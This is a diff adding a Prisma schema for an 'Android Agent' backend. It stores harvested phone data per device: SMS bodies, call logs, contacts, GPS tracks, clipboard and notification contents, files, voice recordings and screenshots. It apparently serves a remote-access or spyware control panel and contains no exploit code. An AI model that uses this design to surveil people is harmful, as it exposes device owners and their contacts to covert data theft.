@@ -1,0 +1,292 @@
+// Android Agent Database Schema - PostgreSQL Version
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+// User Management
+model User {
+  id        String   @id @default(cuid())
+  username  String   @unique
+  password  String   // bcrypt hashed
+  email     String?  @unique
+  role      UserRole @default(ADMIN)
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+  
+  // Relations
+  sessions  Session[]
+  logs      Log[]
+  
+  @@map("users")
+}
+
+model Session {
+  id        String   @id @default(cuid())
+  sessionToken String @unique
+  userId    String
+  expires   DateTime
+  createdAt DateTime @default(now())
+  
+  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
+  
+  @@map("sessions")
+}
+
+// Device Management
+model Device {
+  id          String      @id @default(cuid())
+  deviceId    String      @unique // Android device ID
+  name        String?
+  model       String?
+  manufacturer String?
+  version     String?
+  isOnline    Boolean     @default(false)
+  lastSeen    DateTime    @default(now())
+  firstSeen   DateTime    @default(now())
+  ipAddress   String?
+  location    Json?       // Current location data
+  
+  // Relations
+  callLogs         CallLog[]
+  smsLogs          SmsLog[]
+  contacts         Contact[]
+  apps             InstalledApp[]
+  permissions      Permission[]
+  gpsLogs          GpsLog[]
+  clipboardLogs    ClipboardLog[]
+  notificationLogs NotificationLog[]
+  wifiLogs         WifiLog[]
+  files            FileRecord[]
+  downloads        Download[]
+  
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+  
+  @@map("devices")
+}
+
+// Communication Logs
+model CallLog {
+  id       String   @id @default(cuid())
+  deviceId String
+  phoneNo  String
+  name     String?
+  date     DateTime
+  duration Int?
+  type     CallType
+  hash     String   @unique // For deduplication
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  createdAt DateTime @default(now())
+  
+  @@map("call_logs")
+}
+
+model SmsLog {
+  id       String   @id @default(cuid())
+  deviceId String
+  address  String
+  body     String
+  date     DateTime
+  type     SmsType
+  hash     String   @unique // For deduplication
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  createdAt DateTime @default(now())
+  
+  @@map("sms_logs")
+}
+
+model Contact {
+  id       String @id @default(cuid())
+  deviceId String
+  name     String
+  phoneNo  String
+  hash     String @unique // For deduplication
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  createdAt DateTime @default(now())
+  
+  @@map("contacts")
+}
+
+// Device Information
+model InstalledApp {
+  id          String @id @default(cuid())
+  deviceId    String
+  packageName String
+  appName     String
+  version     String?
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+  
+  @@unique([deviceId, packageName])
+  @@map("installed_apps")
+}
+
+model Permission {
+  id         String @id @default(cuid())
+  deviceId   String
+  permission String
+  granted    Boolean @default(false)
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+  
+  @@unique([deviceId, permission])
+  @@map("permissions")
+}
+
+// Location & GPS
+model GpsLog {
+  id        String  @id @default(cuid())
+  deviceId  String
+  latitude  Float
+  longitude Float
+  altitude  Float?
+  accuracy  Float?
+  speed     Float?
+  enabled   Boolean @default(true)
+  timestamp DateTime @default(now())
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  @@map("gps_logs")
+  @@index([deviceId, timestamp])
+}
+
+// Activity Logs
+model ClipboardLog {
+  id       String   @id @default(cuid())
+  deviceId String
+  content  String
+  timestamp DateTime @default(now())
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  @@map("clipboard_logs")
+}
+
+model NotificationLog {
+  id       String   @id @default(cuid())
+  deviceId String
+  appName  String
+  title    String?
+  content  String
+  key      String
+  postTime DateTime
+  hash     String   @unique // For deduplication
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  createdAt DateTime @default(now())
+  
+  @@map("notification_logs")
+}
+
+model WifiLog {
+  id        String   @id @default(cuid())
+  deviceId  String
+  ssid      String
+  bssid     String
+  level     Int?
+  frequency Int?
+  firstSeen DateTime @default(now())
+  lastSeen  DateTime @default(now())
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  @@unique([deviceId, ssid, bssid])
+  @@map("wifi_logs")
+}
+
+// File Management
+model FileRecord {
+  id       String @id @default(cuid())
+  deviceId String
+  path     String
+  name     String
+  size     Int?
+  isDir    Boolean @default(false)
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  createdAt DateTime @default(now())
+  
+  @@map("file_records")
+}
+
+model Download {
+  id           String      @id @default(cuid())
+  deviceId     String
+  originalName String
+  filePath     String
+  fileSize     Int?
+  type         DownloadType
+  
+  device Device @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  
+  createdAt DateTime @default(now())
+  
+  @@map("downloads")
+}
+
+// System Logs
+model Log {
+  id      String   @id @default(cuid())
+  level   LogLevel
+  message String
+  userId  String?
+  metadata Json?
+  
+  user User? @relation(fields: [userId], references: [id], onDelete: SetNull)
+  
+  createdAt DateTime @default(now())
+  
+  @@map("logs")
+}
+
+// Enums
+enum UserRole {
+  ADMIN
+  USER
+}
+
+enum CallType {
+  INCOMING
+  OUTGOING
+  MISSED
+}
+
+enum SmsType {
+  INBOX
+  SENT
+  DRAFT
+  OUTBOX
+}
+
+enum DownloadType {
+  FILE
+  VOICE_RECORD
+  SCREENSHOT
+}
+
+enum LogLevel {
+  ERROR
+  WARN
+  INFO
+  DEBUG
+}
